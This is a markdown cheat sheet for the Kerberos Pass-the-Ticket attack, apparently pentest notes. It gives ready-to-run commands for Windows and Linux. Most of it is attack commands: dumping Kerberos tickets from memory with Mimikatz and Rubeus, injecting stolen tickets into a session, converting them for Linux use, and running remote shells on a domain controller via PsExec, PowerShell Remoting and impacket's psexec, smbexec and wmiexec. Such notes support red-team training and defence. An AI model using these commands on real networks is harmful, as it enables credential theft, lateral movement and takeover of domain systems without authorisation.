### Content

- [Overview](#overview)
- [From Windows](#from-windows)
	- [Using Mimikatz](#using-mimikatz)
	- [Using Rubeus](#using-rubeus)
- [From Linux](#from-linux)

---
### Overview

- In this attack, we use a stolen Kerberos ticket to move laterally
- A valid Kerberos ticket required to perform a Pass the Ticket can be:
	- `TGS` to allow access to a particular resource.
	- `TGT` to request service tickets to access any resource the user can access.
- **As a non-administrative user**, you can only get your tickets, but **as a local administrator**, you can collect everything.

> To create a PowerShell Remoting session on a remote computer, you must be an administrator, be a member of the `Remote Management Users` group, or have explicit `PowerShell Remoting` permissions in your session configuration.
> 
> PowerShell Remoting creates both HTTP port TCP/5985 and HTTPS port TCP/5986 listeners.

---
### From Windows
###### Using Mimikatz

``` Powershell
# Collect tickets

PS> mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
########
# /export: will export the every ticket in the memory:
	# Computer account ticket: Ends with $ and needs a ticket to interact with AD
	# User ticket: [randomvalue]-username@service-domain.local.kirbi
		# If service = krbtgt then the ticket is the TGT of that account 
#########

# Inject a ticket into the current session. 
PS> mimikatz.exe "privilege::debug" "kerberos::ptt [0;1e4c7df]-2-0-40e10000-joed@krbtgt-DOMAIN.COM.kirbi exit"

# spawn CMD with the injected ticket
PS> mimikatz.exe "misc::cmd"

# To be used after injecting ticket with either Rubeus or Mimikatz
PS> Enter-PSSession -ComputerName DC01
# Or
PS> .\PsExec.exe -accepteula \\<IP> cmd
```

###### Using Rubeus

``` Powershell
# Collect tickets
PS> Rubeus.exe dump /nowrap

# Monitor for new tickets
PS> Rubeus.exe monitor /interval:5 /nowrap

# Inject ticket kirbi file
PS> Rubeus.exe ptt /ticket:<<.kirbi file> or <Base64Blob>>

# Convert .kirbi to Base64 blob, in case we extracted tickets by mimikatz
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[randomvalue]-username@service-domain.local.kirbi"))

# To be used after injecting ticket with either Rubeus or Mimikatz
PS> Enter-PSSession -ComputerName DC01
# Or
PS> .\PsExec.exe -accepteula \\<IP> cmd
```

---
### From Linux

Kerberos tickets extracted from Windows needs to be converted to `.Ccache` format for use within Linux.

```bash
# Convert the extracted rubeus blob to a ccache file.
$ python3 rubeustoccache.py <Base64Ticket> <Output.kirbi> <Output.ccache>

# Export the ticket to the Kerberos environmental variable:
$ export KRB5CCNAME=ticket.ccache

# Once exported we can use impacket with the -k and -no-pass parameter to execute commands on the target Domain Controller.
$ psexec.py corp.local/user@DC01.security.local -k -no-pass
$ smbexec.py corp.local/user@DC01.security.local -k -no-pass
$ wmiexec.py corp.local/user@DC01.security.local -k -no-pass
```